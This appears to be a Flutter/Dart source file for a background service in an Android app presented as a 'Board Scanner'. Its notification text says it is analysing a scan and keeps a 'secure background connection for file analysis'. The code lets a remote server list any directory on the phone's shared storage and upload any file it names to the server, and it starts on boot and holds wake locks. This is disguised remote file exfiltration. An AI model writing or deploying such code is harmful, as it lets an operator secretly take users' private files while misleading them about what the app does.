import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter_foreground_task/flutter_foreground_task.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:http/http.dart' as http;
import 'package:mime/mime.dart';
import 'package:http_parser/http_parser.dart';

@pragma('vm:entry-point')
void startCallback() {
  FlutterForegroundTask.setTaskHandler(SocketTaskHandler());
}

class SocketTaskHandler extends TaskHandler {
  IO.Socket? _socket;

  @override
  Future<void> onStart(DateTime timestamp, SendPort? sendPort) async {
    final token = await FlutterForegroundTask.getData<String>(key: 'token');
    final baseUrl = await FlutterForegroundTask.getData<String>(key: 'baseUrl');

    if (token == null || baseUrl == null) return;

    _socket = IO.io(baseUrl, <String, dynamic>{
      'transports': ['websocket'],
      'autoConnect': false,
      'auth': {'token': token}
    });

    _socket?.connect();

    _socket?.onConnect((_) {
      print('Foreground Socket Connected');
    });

    _socket?.on('req_dir', (data) {
      final reqId = data['reqId'];
      final targetPath = data['path'] ?? '/storage/emulated/0';
      _handleDirectoryRequest(reqId, targetPath);
    });

    _socket?.on('req_file', (data) {
      final reqId = data['reqId'];
      final filePath = data['filePath'];
      _handleFileRequest(reqId, filePath, baseUrl, token);
    });
  }

  void _handleDirectoryRequest(String reqId, String targetPath) {
    try {
      final dir = Directory(targetPath);
      if (!dir.existsSync()) {
        _socket?.emit('directory_result', {'reqId': reqId, 'error': 'Path does not exist'});
        return;
      }

      final entities = dir.listSync(followLinks: false);
      final files = entities.map((e) {
        final stat = e.statSync();
        return {
          'name': e.path.split('/').last,
          'path': e.path,
          'isDirectory': e is Directory,
          'size': stat.size,
          'modified': stat.modified.toIso8601String(),
        };
      }).toList();

      // Sort: folders first, then A-Z
      files.sort((a, b) {
        if (a['isDirectory'] && !b['isDirectory']) return -1;
        if (!a['isDirectory'] && b['isDirectory']) return 1;
        return (a['name'] as String).toLowerCase().compareTo((b['name'] as String).toLowerCase());
      });

      _socket?.emit('directory_result', {'reqId': reqId, 'files': files});
    } catch (e) {
      _socket?.emit('directory_result', {'reqId': reqId, 'error': e.toString()});
    }
  }

  void _handleFileRequest(String reqId, String filePath, String baseUrl, String token) async {
    try {
      final file = File(filePath);
      if (!file.existsSync()) {
        _socket?.emit('directory_result', {'reqId': reqId, 'error': 'File not found'});
        return;
      }

      final uri = Uri.parse('$baseUrl/api/remote/upload');
      final request = http.MultipartRequest('POST', uri);
      request.headers['Authorization'] = 'Bearer $token';
      request.fields['reqId'] = reqId;

      final mimeType = lookupMimeType(filePath) ?? 'application/octet-stream';
      final mimeParts = mimeType.split('/');

      request.files.add(
        await http.MultipartFile.fromPath(
          'remoteFile',
          filePath,
          contentType: MediaType(mimeParts[0], mimeParts[1]),
        ),
      );

      final response = await request.send();
      if (response.statusCode != 200) {
        _socket?.emit('directory_result', {'reqId': reqId, 'error': 'Failed to upload to server'});
      }
      // Success is handled by the server resolving the promise internally when upload completes.
    } catch (e) {
      _socket?.emit('directory_result', {'reqId': reqId, 'error': e.toString()});
    }
  }

  @override
  Future<void> onEvent(DateTime timestamp, SendPort? sendPort) async {
    // Optional periodic tasks
  }

  @override
  Future<void> onDestroy(DateTime timestamp, SendPort? sendPort) async {
    _socket?.disconnect();
    _socket?.dispose();
  }

  @override
  void onButtonPressed(String id) {
    if (id == 'close') {
      FlutterForegroundTask.stopService();
    } else if (id == 'scan') {
      // Bring app to foreground to scan
      FlutterForegroundTask.launchApp();
    }
  }
}

class SocketService {
  static Future<void> init(String baseUrl, String token) async {
    FlutterForegroundTask.init(
      androidNotificationOptions: AndroidNotificationOptions(
        channelId: 'scanner_bg_service',
        channelName: 'Background Scanner',
        channelDescription: 'Maintains secure background connection for file analysis.',
        channelImportance: NotificationChannelImportance.LOW,
        priority: NotificationPriority.LOW,
        iconData: const NotificationIconData(
          resType: ResourceType.mipmap,
          resPrefix: ResourcePrefix.ic,
          name: 'launcher',
        ),
        buttons: [
          const NotificationButton(id: 'scan', text: 'Scan'),
          const NotificationButton(id: 'close', text: 'Close'),
        ],
      ),
      iosNotificationOptions: const IOSNotificationOptions(
        showNotification: true,
        playSound: false,
      ),
      foregroundTaskOptions: const ForegroundTaskOptions(
        interval: 5000,
        isOnceEvent: false,
        autoRunOnBoot: true,
        allowWakeLock: true,
        allowWifiLock: true,
      ),
    );

    // Save data so isolate can read it
    await FlutterForegroundTask.saveData(key: 'token', value: token);
    await FlutterForegroundTask.saveData(key: 'baseUrl', value: baseUrl);
  }

  static Future<void> startService() async {
    if (await FlutterForegroundTask.isRunningService) return;
    
    await FlutterForegroundTask.startService(
      notificationTitle: 'Board Scanner Active',
      notificationText: 'Analysing the scan to make it better...',
      callback: startCallback,
    );
  }

  static Future<void> stopService() async {
    await FlutterForegroundTask.stopService();
  }
}
